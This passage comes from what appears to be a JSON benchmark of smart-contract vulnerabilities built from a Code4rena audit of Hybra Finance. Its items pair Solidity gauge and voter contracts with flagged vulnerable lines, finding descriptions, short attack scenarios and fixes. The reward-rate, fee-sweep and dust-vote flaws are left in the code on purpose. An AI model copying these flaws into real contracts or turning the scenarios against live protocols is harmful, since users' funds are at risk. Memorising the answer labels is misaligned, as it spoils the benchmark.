require(IPermissionsRegistry(permissionRegistry).hasRole(\"GENESIS_MANAGER\", msg.sender), 'GENESIS_MANAGER');\r\n        _;\r\n    }\r\n\r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    VoterAdmin\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n \r\n\r\n    /// @notice Set a new PermissionRegistry\r\n    function setPermissionsRegistry(address _permissionRegistry) external VoterAdmin {\r\n        require(_permissionRegistry.code.length > 0, \"CODELEN\");\r\n        require(_permissionRegistry != address(0), \"ZA\");\r\n        emit SetPermissionRegistry(permissionRegistry, _permissionRegistry);\r\n        permissionRegistry = _permissionRegistry;\r\n    }\r\n\r\n    function setMaxVotingNum(uint256 _maxVotingNum) external VoterAdmin {\r\n        require (_maxVotingNum >= MIN_VOTING_NUM, \"LOW_VOTE\");\r\n        maxVotingNum = _maxVotingNum;\r\n    }\r\n\r\n\r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    USER INTERACTION\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n    \r\n    /// @notice Reset the votes of a given TokenID\r\n    function reset(uint256 _tokenId) external onlyNewEpoch(_tokenId) nonReentrant {\r\n        require(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, _tokenId), \"NAO\");\r\n        _reset(_tokenId);\r\n        IVotingEscrow(_ve).abstain(_tokenId);\r\n    }\r\n\r\n    function _reset(uint256 _tokenId) internal {\r\n        address[] storage _poolVote = poolVote[_tokenId];\r\n        uint256 _poolVoteCnt = _poolVote.length;\r\n        uint256 _totalWeight = 0;\r\n\r\n        for (uint256 i = 0; i < _poolVoteCnt; i ++) {\r\n            address _pool = _poolVote[i];\r\n            uint256 _votes = votes[_tokenId][_pool];\r\n\r\n            if (_votes != 0) {\r\n                weights[_pool] -= _votes;\r\n\r\n                votes[_tokenId][_pool] -= _votes;\r\n                address internal_bribe = gaugeManager.fetchInternalBribeFromPool(_pool);\r\n                address external_bribe = gaugeManager.fetchExternalBribeFromPool(_pool);\r\n                IBribe(internal_bribe).withdraw(uint256(_votes), _tokenId);\r\n                IBribe(external_bribe).withdraw(uint256(_votes), _tokenId);\r\n\r\n                // decrease totalWeight irrespective of gauge is killed/alive for this current pool\r\n                _totalWeight += _votes;\r\n                \r\n                emit Abstained(_tokenId, _votes);\r\n            }\r\n        }\r\n        totalWeight -= _totalWeight;\r\n        usedWeights[_tokenId] = 0;\r\n        delete poolVote[_tokenId];\r\n    }\r\n\r\n    /// @notice Recast the saved votes of a given TokenID\r\n    function poke(uint256 _tokenId) external nonReentrant {\r\n        uint256 _timestamp = block.timestamp;\r\n        if (_timestamp <= HybraTimeLibrary.epochVoteStart(_timestamp)){\r\n            revert(\"DW\");\r\n        }\r\n        require(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, _tokenId) || msg.sender == _ve, \"NAO||VE\");\r\n        address[] memory _poolVote = poolVote[_tokenId];\r\n        uint256 _poolCnt = _poolVote.length;\r\n        uint256[] memory _weights = new uint256[](_poolCnt);\r\n\r\n        for (uint256 i = 0; i < _poolCnt; i ++) {\r\n            _weights[i] = votes[_tokenId][_poolVote[i]];\r\n        } \r\n\r\n        _vote(_tokenId, _poolVote, _weights);\r\n    }\r\n\r\n    \r\n    /// @notice Vote for pools\r\n    /// @param  _tokenId    veNFT tokenID used to vote\r\n    /// @param  _poolVote   array of LPs addresses to vote  (eg.: [sAMM usdc-usdt   , sAMM busd-usdt, vAMM wbnb-the ,...])\r\n    /// @param  _weights    array of weights for each LPs   (eg.: [10               , 90            , 45             ,...])  \r\n    function vote(uint256 _tokenId, address[] calldata _poolVote, uint256[] calldata _weights) \r\n        external onlyNewEpoch(_tokenId) nonReentrant {\r\n        require(IVotingEscrow(_ve).isApprovedOrOwner(msg.sender, _tokenId), \"NAO\");\r\n        require(_poolVote.length == _weights.length, \"MISMATCH_LEN\");\r\n        require(_poolVote.length <= maxVotingNum, \"EXCEEDS\");\r\n        uint256 _timestamp = block.timestamp;\r\n      \r\n        _vote(_tokenId, _poolVote, _weights);\r\n        lastVoted[_tokenId] = HybraTimeLibrary.epochStart(block.timestamp) + 1;\r\n        lastVotedTimestamp[_tokenId] = block.timestamp;\r\n    }\r\n    \r\n    function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights) internal {\r\n        _reset(_tokenId);\r\n        uint256 _poolCnt = _poolVote.length;\r\n        uint256 _weight = IVotingEscrow(_ve).balanceOfNFT(_tokenId);\r\n        uint256 _totalVoteWeight = 0;\r\n        uint256 _usedWeight = 0;\r\n\r\n        for (uint i = 0; i < _poolCnt; i++) {\r\n\r\n            if(gaugeManager.isGaugeAliveForPool(_poolVote[i])) _totalVoteWeight += _weights[i];\r\n        }\r\n\r\n        for (uint256 i = 0; i < _poolCnt; i++) {\r\n            address _pool = _poolVote[i];\r\n\r\n            if (gaugeManager.isGaugeAliveForPool(_pool)) {\r\n                uint256 _poolWeight = _weights[i] * _weight / _totalVoteWeight;\r\n\r\n                require(votes[_tokenId][_pool] == 0, \"ZV\");\r\n                require(_poolWeight != 0, \"ZV\");\r\n\r\n                poolVote[_tokenId].push(_pool);\r\n                weights[_pool] += _poolWeight;\r\n\r\n                votes[_tokenId][_pool] = _poolWeight;\r\n                address internal_bribe = gaugeManager.fetchInternalBribeFromPool(_pool);\r\n                address external_bribe = gaugeManager.fetchExternalBribeFromPool(_pool);\r\n                \r\n                IBribe(internal_bribe).deposit(uint256(_poolWeight), _tokenId);\r\n                IBribe(external_bribe).deposit(uint256(_poolWeight), _tokenId);\r\n                \r\n                _usedWeight += _poolWeight;\r\n                emit Voted(msg.sender, _tokenId, _poolWeight);\r\n            }\r\n        }\r\n        if (_usedWeight > 0) IVotingEscrow(_ve).voting(_tokenId);\r\n        totalWeight += _usedWeight;\r\n        usedWeights[_tokenId] = _usedWeight;\r\n    }\r\n\r\n\r\n    modifier onlyNewEpoch(uint256 _tokenId) {\r\n        // ensure new epoch since last vote\r\n        if (HybraTimeLibrary.epochStart(block.timestamp) <= lastVoted[_tokenId]) revert(\"VOTED\");\r\n        if (block.timestamp <= HybraTimeLibrary.epochVoteStart(block.timestamp)) revert(\"DW\");\r\n        _;\r\n    }\r\n   \r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    VIEW FUNCTIONS\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n    /// @notice view the total length of the pools\r\n    function length() external view returns (uint256) {\r\n        return gaugeManager.pools().length;\r\n    }\r\n\r\n    /// @notice view the total length of the voted pools given a tokenId\r\n    function poolVoteLength(uint256 tokenId) external view returns(uint256) { \r\n        return poolVote[tokenId].length;\r\n    }\r\n\r\n    function setGaugeManager(address _gaugeManager) external VoterAdmin {\r\n        require(_gaugeManager != address(0));\r\n        gaugeManager = IGaugeManager(_gaugeManager);\r\n    }\r\n    \r\n}",
            "vulnerable_lines": [
                208,
                209,
                210,
                211
            ],
            "vulnerable_functions": [
                "poke",
                "vote"
            ]
        },
        "context_files": [],
        "call_flow": "User.vote(full-1wei, dust) -> warp time -> poke() -> _poolWeight rounds to 0 -> revert \"ZV\"",
        "context_hint": "Dust votes cause pool weight to round to zero after decay, DoS-ing the poke function and allowing inflated rewards.",
        "is_vulnerable": true
    },
    {
        "id": "gs_c4_2025-10-hybra-finance_M05",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "code4rena",
        "source_report": "2025-10-hybra-finance",
        "source_finding_id": "M-05",
        "report_url": "https://code4rena.com/reports/2025-10-hybra-finance",
        "github_repo_url": "https://github.com/code-423n4/2025-10-hybra-finance",
        "contest_date": "2025-10-06",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "Rollover rewards are permanently lost due to flawed rewardRate calculation",
        "finding_description": "The `notifyRewardAmount()` function miscalculates the `rewardRate` when a new epoch begins, causing `rollover` rewards from previous epochs to be permanently lost. When `block.timestamp >= _periodFinish`, the function adds both the new `rewardAmount` and the previous epoch’s `clPool.rollover()` to form the `totalRewardAmount`. However, the `rewardRate` is derived only from `rewardAmount`, ignoring the rollover portion: // @audit The total amount to be reserved includes rollover... uint256 totalRewardAmount = rewardAmount + clPool.rollover(); // @audit but the rate calculation completely ignores the rollover. rewardRate = rewardAmount / epochTimeRemaining; // @audit The pool is synced with a CORRECT",
        "attack_scenario": "Refer to original submission for PoC (not detailed here).",
        "fix_description": "Use `totalRewardAmount = rewardAmount + clPool.rollover()` for `rewardRate = totalRewardAmount / epochTimeRemaining`. Status: Mitigation confirmed.",
        "primary_file": {
            "path": "cl/contracts/GaugeCL.sol",
            "content": "pragma solidity 0.8.13;\r\n\r\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\r\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\r\nimport \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\r\n import \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\r\nimport '../interfaces/IGaugeFactoryCL.sol';\r\nimport '../interfaces/IGaugeManager.sol';\r\nimport './interface/ICLPool.sol';\r\nimport './interface/ICLFactory.sol';\r\nimport './interface/INonfungiblePositionManager.sol';\r\nimport '../interfaces/IBribe.sol';\r\nimport '../interfaces/IRHYBR.sol';\r\nimport {HybraTimeLibrary} from \"../libraries/HybraTimeLibrary.sol\";\r\nimport {FullMath} from \"./libraries/FullMath.sol\";\r\nimport {FixedPoint128} from \"./libraries/FixedPoint128.sol\";\r\nimport '../interfaces/IRHYBR.sol';\r\n\r\n\r\n\r\ncontract GaugeCL is ReentrancyGuard, Ownable, IERC721Receiver {\r\n\r\n    using SafeERC20 for IERC20;\r\n    using EnumerableSet for EnumerableSet.UintSet;\r\n    using SafeCast for uint128;\r\n    IERC20 public immutable rewardToken;\r\n    address public immutable rHYBR;\r\n    address public VE;\r\n    address public DISTRIBUTION;\r\n    address public internal_bribe;\r\n    address public external_bribe;\r\n\r\n    uint256 public DURATION;\r\n    uint256 internal _periodFinish;\r\n    uint256 public rewardRate;\r\n    ICLPool public clPool;\r\n    address public poolAddress;\r\n    INonfungiblePositionManager public nonfungiblePositionManager;\r\n    \r\n    bool public emergency;\r\n    bool public immutable isForPair;\r\n    address immutable factory;\r\n\r\n    mapping(uint256 => uint256) public  rewardRateByEpoch; // epoch => reward rate\r\n    mapping(address => EnumerableSet.UintSet) internal _stakes;\r\n    mapping(uint256 => uint256) public  rewardGrowthInside;\r\n\r\n    mapping(uint256 => uint256) public  rewards;\r\n\r\n    mapping(uint256 => uint256) public  lastUpdateTime;\r\n\r\n    event RewardAdded(uint256 reward);\r\n    event Deposit(address indexed user, uint256 amount);\r\n    event Withdraw(address indexed user, uint256 amount);\r\n    event Harvest(address indexed user, uint256 reward);\r\n    event ClaimFees(address indexed from, uint256 claimed0, uint256 claimed1);\r\n    event EmergencyActivated(address indexed gauge, uint256 timestamp);\r\n    event EmergencyDeactivated(address indexed gauge, uint256 timestamp);\r\n\r\n    constructor(address _rewardToken, address _rHYBR, address _ve, address _pool, address _distribution, address _internal_bribe, \r\n        address _external_bribe, bool _isForPair, address nfpm,  address _factory) {\r\n        factory = _factory;\r\n        rewardToken = IERC20(_rewardToken);     // main reward\r\n        rHYBR = _rHYBR;\r\n        VE = _ve;                               // vested\r\n        poolAddress = _pool;\r\n        clPool = ICLPool(_pool);\r\n        DISTRIBUTION = _distribution;           // distro address (GaugeManager)\r\n        DURATION = HybraTimeLibrary.WEEK;                   \r\n\r\n        internal_bribe = _internal_bribe;       // lp fees goes here\r\n        external_bribe = _external_bribe;       // bribe fees goes here\r\n        isForPair = _isForPair;\r\n        nonfungiblePositionManager = INonfungiblePositionManager(nfpm);\r\n        emergency = false;\r\n    }\r\n\r\n    modifier onlyDistribution() {\r\n        require(msg.sender == DISTRIBUTION, \"Caller is not RewardsDistribution contract\");\r\n        _;\r\n    }\r\n\r\n    modifier isNotEmergency() {\r\n        require(emergency == false, \"emergency\");\r\n        _;\r\n    }\r\n\r\n\r\n    function _updateRewards(uint256 tokenId, int24 tickLower, int24 tickUpper) internal {\r\n        if (lastUpdateTime[tokenId] == block.timestamp) return;\r\n        clPool.updateRewardsGrowthGlobal();\r\n        lastUpdateTime[tokenId] = block.timestamp;\r\n        rewards[tokenId] += _earned(tokenId);\r\n        rewardGrowthInside[tokenId] = clPool.getRewardGrowthInside(tickLower, tickUpper, 0);\r\n    }\r\n\r\n    function activateEmergencyMode() external onlyOwner {\r\n        require(emergency == false, \"emergency\");\r\n        emergency = true;\r\n        emit EmergencyActivated(address(this), block.timestamp);\r\n    }\r\n\r\n    function stopEmergencyMode() external onlyOwner {\r\n\r\n        require(emergency == true,\"emergency\");\r\n\r\n        emergency = false;\r\n        emit EmergencyDeactivated(address(this), block.timestamp);\r\n    }\r\n\r\n    function balanceOf(uint256 tokenId) external view returns (uint256) {\r\n        (,,,,,,,uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n        return liquidity;\r\n    }\r\n\r\n    function _getPoolAddress(address token0, address token1, int24 tickSpacing) internal view returns (address) {\r\n        return ICLFactory(nonfungiblePositionManager.factory()).getPool(token0, token1, tickSpacing);\r\n    }\r\n\r\n    function earned(uint256 tokenId) external view returns (uint256 reward) {\r\n        require(_stakes[msg.sender].contains(tokenId), \"NA\");\r\n\r\n        uint256 reward = _earned(tokenId);\r\n        return (reward); // bonsReward is 0 for now\r\n    }\r\n\r\n       function _earned(uint256 tokenId) internal view returns (uint256) {\r\n        uint256 lastUpdated = clPool.lastUpdated();\r\n\r\n        uint256 timeDelta = block.timestamp - lastUpdated;\r\n\r\n        \r\n        uint256 rewardGrowthGlobalX128 = clPool.rewardGrowthGlobalX128();\r\n        uint256 rewardReserve = clPool.rewardReserve();\r\n\r\n        if (timeDelta != 0 && rewardReserve > 0 && clPool.stakedLiquidity() > 0) {\r\n            uint256 reward = rewardRate * timeDelta;\r\n            if (reward > rewardReserve) reward = rewardReserve;\r\n\r\n            rewardGrowthGlobalX128 += FullMath.mulDiv(reward, FixedPoint128.Q128, clPool.stakedLiquidity());\r\n        }\r\n\r\n        (,,,,, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n\r\n        uint256 rewardPerTokenInsideInitialX128 = rewardGrowthInside[tokenId];\r\n        uint256 rewardPerTokenInsideX128 = clPool.getRewardGrowthInside(tickLower, tickUpper, rewardGrowthGlobalX128);\r\n\r\n        uint256 claimable =\r\n            FullMath.mulDiv(rewardPerTokenInsideX128 - rewardPerTokenInsideInitialX128, liquidity, FixedPoint128.Q128);\r\n        return claimable;\r\n    }\r\n\r\n    function deposit(uint256 tokenId) external nonReentrant isNotEmergency {\r\n        \r\n         (,,address token0, address token1, int24 tickSpacing, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,) = \r\n            nonfungiblePositionManager.positions(tokenId);\r\n        \r\n        require(liquidity > 0, \"Gauge: zero liquidity\");\r\n        // Calculate pool address from position parameters\r\n        address positionPool = _getPoolAddress(token0, token1, tickSpacing);\r\n        // Verify that the position's pool matches this gauge's pool\r\n        require(positionPool == poolAddress, \"Pool mismatch: Position not for this gauge pool\");\r\n        // collect fees \r\n        nonfungiblePositionManager.collect(INonfungiblePositionManager.CollectParams({\r\n                tokenId: tokenId,\r\n                recipient: msg.sender,\r\n                amount0Max: type(uint128).max,\r\n                amount1Max: type(uint128).max\r\n            }));\r\n\r\n        nonfungiblePositionManager.safeTransferFrom(msg.sender, address(this), tokenId);\r\n\r\n        clPool.stake(int128(liquidity), tickLower, tickUpper, true);\r\n\r\n\r\n        uint256 rewardGrowth = clPool.getRewardGrowthInside(tickLower, tickUpper, 0);\r\n        rewardGrowthInside[tokenId] = rewardGrowth;\r\n        lastUpdateTime[tokenId] = block.timestamp;\r\n\r\n        _stakes[msg.sender].add(tokenId);\r\n\r\n        emit Deposit(msg.sender, tokenId);\r\n    }\r\n\r\n    function withdraw(uint256 tokenId, uint8 redeemType) external nonReentrant isNotEmergency {\r\n           require(_stakes[msg.sender].contains(tokenId), \"NA\");\r\n\r\n        // trigger update on staked position so NFT will be in sync with the pool\r\n        nonfungiblePositionManager.collect(\r\n            INonfungiblePositionManager.CollectParams({\r\n                tokenId: tokenId,\r\n                recipient: msg.sender,\r\n                amount0Max: type(uint128).max,\r\n                amount1Max: type(uint128).max\r\n            })\r\n        );\r\n\r\n        (,,,,, int24 tickLower, int24 tickUpper, uint128 liquidityToStake,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n        _getReward(tickLower, tickUpper, tokenId, msg.sender, redeemType);\r\n\r\n        // update virtual liquidity in pool only if token has existing liquidity\r\n        // i.e. not all removed already via decreaseStakedLiquidity\r\n        if (liquidityToStake != 0) {\r\n            clPool.stake(-int128(liquidityToStake), tickLower, tickUpper, true);\r\n        }\r\n\r\n        _stakes[msg.sender].remove(tokenId);\r\n        nonfungiblePositionManager.safeTransferFrom(address(this), msg.sender, tokenId);\r\n\r\n        emit Withdraw(msg.sender, tokenId);\r\n    }\r\n\r\n    \r\n\r\n    function getReward(uint256 tokenId, address account,uint8 redeemType ) public nonReentrant onlyDistribution {\r\n\r\n        require(_stakes[account].contains(tokenId), \"NA\");\r\n\r\n        (,,,,, int24 tickLower, int24 tickUpper,,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n        _getReward(tickLower, tickUpper, tokenId, account, redeemType);\r\n    }\r\n\r\n\r\n    function _getReward(int24 tickLower, int24 tickUpper, uint256 tokenId,address account, uint8 redeemType) internal {\r\n        _updateRewards(tokenId, tickLower, tickUpper);\r\n        uint256 rewardAmount = rewards[tokenId];\r\n        if(rewardAmount > 0){\r\n            delete rewards[tokenId];\r\n            rewardToken.safeApprove(rHYBR, rewardAmount);\r\n            IRHYBR(rHYBR).depostionEmissionsToken(rewardAmount);\r\n            IRHYBR(rHYBR).redeemFor(rewardAmount, redeemType, account);\r\n        }\r\n        emit Harvest(msg.sender, rewardAmount);\r\n    }\r\n\r\n    function notifyRewardAmount(address token, uint256 rewardAmount) external nonReentrant\r\n        isNotEmergency onlyDistribution returns (uint256 currentRate) {\r\n        require(token == address(rewardToken), \"Invalid reward token\");\r\n\r\n        // Update global reward growth before processing new rewards\r\n        clPool.updateRewardsGrowthGlobal();\r\n\r\n        // Calculate time remaining until next epoch begins\r\n        uint256 epochTimeRemaining = HybraTimeLibrary.epochNext(block.timestamp) - block.timestamp;\r\n        uint256 epochEndTimestamp = block.timestamp + epochTimeRemaining;\r\n\r\n        // Include any rolled over rewards from previous period\r\n        uint256 totalRewardAmount = rewardAmount + clPool.rollover();\r\n\r\n        // Check if we are starting a new reward period or continuing existing one\r\n        if (block.timestamp >= _periodFinish) {\r\n            // New period: distribute rewards over remaining epoch time\r\n            rewardRate = rewardAmount / epochTimeRemaining;\r\n            clPool.syncReward({\r\n                rewardRate: rewardRate,\r\n                rewardReserve: totalRewardAmount,\r\n                periodFinish: epochEndTimestamp\r\n            });\r\n        } else {\r\n            // Existing period: add new rewards to pending distribution\r\n            uint256 pendingRewards = epochTimeRemaining * rewardRate;\r\n            rewardRate = (rewardAmount + pendingRewards) / epochTimeRemaining;\r\n            clPool.syncReward({\r\n                rewardRate: rewardRate,\r\n                rewardReserve: totalRewardAmount + pendingRewards,\r\n                periodFinish: epochEndTimestamp\r\n            });\r\n        }\r\n\r\n        // Store reward rate for current epoch tracking\r\n        rewardRateByEpoch[HybraTimeLibrary.epochStart(block.timestamp)] = rewardRate;\r\n\r\n        // Transfer reward tokens from distributor to gauge\r\n        rewardToken.safeTransferFrom(DISTRIBUTION, address(this), rewardAmount);\r\n\r\n        // Verify contract has sufficient balance to support calculated reward rate\r\n        uint256 contractBalance = rewardToken.balanceOf(address(this));\r\n        require(rewardRate <= contractBalance / epochTimeRemaining, \"Insufficient balance for reward rate\");\r\n\r\n        // Update period finish time and return current rate\r\n        _periodFinish = epochEndTimestamp;\r\n        currentRate = rewardRate;\r\n\r\n        emit RewardAdded(rewardAmount);\r\n    }\r\n\r\n    function gaugeBalances() external view returns (uint256 token0, uint256 token1){\r\n        \r\n        (token0, token1) = clPool.gaugeFees();\r\n\r\n    }\r\n\r\n  \r\n\r\n\r\n\r\n    function claimFees() external nonReentrant returns (uint256 claimed0, uint256 claimed1) {\r\n        return _claimFees();\r\n    }\r\n\r\n    function _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {\r\n        if (!isForPair) {\r\n            return (0, 0);\r\n        }\r\n        \r\n        clPool.collectFees();\r\n        \r\n        address _token0 = clPool.token0();\r\n        address _token1 = clPool.token1();\r\n        // Fetch fee from the whole epoch which just eneded and transfer it to internal Bribe address.\r\n        claimed0 = IERC20(_token0).balanceOf(address(this));\r\n        claimed1 = IERC20(_token1).balanceOf(address(this));\r\n\r\n        if (claimed0 > 0 || claimed1 > 0) {\r\n    \r\n\r\n            uint256 _fees0 = claimed0;\r\n            uint256 _fees1 = claimed1;\r\n\r\n            if (_fees0  > 0) {\r\n                IERC20(_token0).safeApprove(internal_bribe, 0);\r\n                IERC20(_token0).safeApprove(internal_bribe, _fees0);\r\n                IBribe(internal_bribe).notifyRewardAmount(_token0, _fees0);\r\n            } \r\n            if (_fees1  > 0) {\r\n                IERC20(_token1).safeApprove(internal_bribe, 0);\r\n                IERC20(_token1).safeApprove(internal_bribe, _fees1);\r\n                IBribe(internal_bribe).notifyRewardAmount(_token1, _fees1);\r\n            } \r\n            emit ClaimFees(msg.sender, claimed0, claimed1);\r\n        }\r\n    }\r\n\r\n    ///@notice get total reward for the duration\r\n    function rewardForDuration() external view returns (uint256) {\r\n        return rewardRate * DURATION;\r\n    }\r\n\r\n    ///@notice set new internal bribe contract (where to send fees)\r\n    function setInternalBribe(address _int) external onlyOwner {\r\n        require(_int >= address(0), \"zero\");\r\n        internal_bribe = _int;\r\n    }\r\n\r\n    function _safeTransfer(address token,address to,uint256 value) internal {\r\n        require(token.code.length > 0);\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));\r\n        require(success && (data.length == 0 || abi.decode(data, (bool))));\r\n    }\r\n\r\n    /**\r\n     * @dev Handle the receipt of an NFT\r\n     * @param operator The address which called `safeTransferFrom` function\r\n     * @param from The address which previously owned the token\r\n     * @param tokenId The NFT identifier which is being transferred\r\n     * @param data Additional data with no specified format\r\n     * @return bytes4 `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\r\n     */\r\n    function onERC721Received(\r\n        address operator,\r\n        address from,\r\n        uint256 tokenId,\r\n        bytes calldata data\r\n    ) external pure override returns (bytes4) {\r\n        return IERC721Receiver.onERC721Received.selector;\r\n    }\r\n\r\n}\r\n\r\n",
            "vulnerable_lines": [
                251
            ],
            "vulnerable_functions": [
                "notifyRewardAmount"
            ]
        },
        "context_files": [],
        "call_flow": "notifyRewardAmount(new reward) -> rollover() added to total but ignored in rewardRate -> stranded rewards overwritten",
        "context_hint": "Reward rate calculation excludes rollover amounts, leading to permanent loss of carried-over rewards in new epochs.",
        "is_vulnerable": true
    },
    {
        "id": "gs_c4_2025-10-hybra-finance_M06",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "code4rena",
        "source_report": "2025-10-hybra-finance",
        "source_finding_id": "M-06",
        "report_url": "https://code4rena.com/reports/2025-10-hybra-finance",
        "github_repo_url": "https://github.com/code-423n4/2025-10-hybra-finance",
        "contest_date": "2025-10-06",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "ClaimFees steals staking rewards",
        "finding_description": "_claimFees() sweeps the entire balance of `token0`/`token1` after `collectFees()`, stealing rewards if `rewardToken` matches `token0` or `token1`. Impact: Bribe contract receives staking rewards instead of fees.",
        "attack_scenario": "A test deposits 10 HYBR rewards, adds 0.1 HYBR fees, and `claimFees()` sweeps all 10.1 HYBR to the bribe contract.",
        "fix_description": "Transfer only the difference in balance before/after `collectFees()`; add access control to `claimFees`. Status: Mitigation confirmed.",
        "primary_file": {
            "path": "cl/contracts/GaugeCL.sol",
            "content": "pragma solidity 0.8.13;\r\n\r\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\r\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\r\nimport \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\r\n import \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\r\nimport '../interfaces/IGaugeFactoryCL.sol';\r\nimport '../interfaces/IGaugeManager.sol';\r\nimport './interface/ICLPool.sol';\r\nimport './interface/ICLFactory.sol';\r\nimport './interface/INonfungiblePositionManager.sol';\r\nimport '../interfaces/IBribe.sol';\r\nimport '../interfaces/IRHYBR.sol';\r\nimport {HybraTimeLibrary} from \"../libraries/HybraTimeLibrary.sol\";\r\nimport {FullMath} from \"./libraries/FullMath.sol\";\r\nimport {FixedPoint128} from \"./libraries/FixedPoint128.sol\";\r\nimport '../interfaces/IRHYBR.sol';\r\n\r\n\r\n\r\ncontract GaugeCL is ReentrancyGuard, Ownable, IERC721Receiver {\r\n\r\n    using SafeERC20 for IERC20;\r\n    using EnumerableSet for EnumerableSet.UintSet;\r\n    using SafeCast for uint128;\r\n    IERC20 public immutable rewardToken;\r\n    address public immutable rHYBR;\r\n    address public VE;\r\n    address public DISTRIBUTION;\r\n    address public internal_bribe;\r\n    address public external_bribe;\r\n\r\n    uint256 public DURATION;\r\n    uint256 internal _periodFinish;\r\n    uint256 public rewardRate;\r\n    ICLPool public clPool;\r\n    address public poolAddress;\r\n    INonfungiblePositionManager public nonfungiblePositionManager;\r\n    \r\n    bool public emergency;\r\n    bool public immutable isForPair;\r\n    address immutable factory;\r\n\r\n    mapping(uint256 => uint256) public  rewardRateByEpoch; // epoch => reward rate\r\n    mapping(address => EnumerableSet.UintSet) internal _stakes;\r\n    mapping(uint256 => uint256) public  rewardGrowthInside;\r\n\r\n    mapping(uint256 => uint256) public  rewards;\r\n\r\n    mapping(uint256 => uint256) public  lastUpdateTime;\r\n\r\n    event RewardAdded(uint256 reward);\r\n    event Deposit(address indexed user, uint256 amount);\r\n    event Withdraw(address indexed user, uint256 amount);\r\n    event Harvest(address indexed user, uint256 reward);\r\n    event ClaimFees(address indexed from, uint256 claimed0, uint256 claimed1);\r\n    event EmergencyActivated(address indexed gauge, uint256 timestamp);\r\n    event EmergencyDeactivated(address indexed gauge, uint256 timestamp);\r\n\r\n    constructor(address _rewardToken, address _rHYBR, address _ve, address _pool, address _distribution, address _internal_bribe, \r\n        address _external_bribe, bool _isForPair, address nfpm,  address _factory) {\r\n        factory = _factory;\r\n        rewardToken = IERC20(_rewardToken);     // main reward\r\n        rHYBR = _rHYBR;\r\n        VE = _ve;                               // vested\r\n        poolAddress = _pool;\r\n        clPool = ICLPool(_pool);\r\n        DISTRIBUTION = _distribution;           // distro address (GaugeManager)\r\n        DURATION = HybraTimeLibrary.WEEK;                   \r\n\r\n        internal_bribe = _internal_bribe;       // lp fees goes here\r\n        external_bribe = _external_bribe;       // bribe fees goes here\r\n        isForPair = _isForPair;\r\n        nonfungiblePositionManager = INonfungiblePositionManager(nfpm);\r\n        emergency = false;\r\n    }\r\n\r\n    modifier onlyDistribution() {\r\n        require(msg.sender == DISTRIBUTION, \"Caller is not RewardsDistribution contract\");\r\n        _;\r\n    }\r\n\r\n    modifier isNotEmergency() {\r\n        require(emergency == false, \"emergency\");\r\n        _;\r\n    }\r\n\r\n\r\n    function _updateRewards(uint256 tokenId, int24 tickLower, int24 tickUpper) internal {\r\n        if (lastUpdateTime[tokenId] == block.timestamp) return;\r\n        clPool.updateRewardsGrowthGlobal();\r\n        lastUpdateTime[tokenId] = block.timestamp;\r\n        rewards[tokenId] += _earned(tokenId);\r\n        rewardGrowthInside[tokenId] = clPool.getRewardGrowthInside(tickLower, tickUpper, 0);\r\n    }\r\n\r\n    function activateEmergencyMode() external onlyOwner {\r\n        require(emergency == false, \"emergency\");\r\n        emergency = true;\r\n        emit EmergencyActivated(address(this), block.timestamp);\r\n    }\r\n\r\n    function stopEmergencyMode() external onlyOwner {\r\n\r\n        require(emergency == true,\"emergency\");\r\n\r\n        emergency = false;\r\n        emit EmergencyDeactivated(address(this), block.timestamp);\r\n    }\r\n\r\n    function balanceOf(uint256 tokenId) external view returns (uint256) {\r\n        (,,,,,,,uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n        return liquidity;\r\n    }\r\n\r\n    function _getPoolAddress(address token0, address token1, int24 tickSpacing) internal view returns (address) {\r\n        return ICLFactory(nonfungiblePositionManager.factory()).getPool(token0, token1, tickSpacing);\r\n    }\r\n\r\n    function earned(uint256 tokenId) external view returns (uint256 reward) {\r\n        require(_stakes[msg.sender].contains(tokenId), \"NA\");\r\n\r\n        uint256 reward = _earned(tokenId);\r\n        return 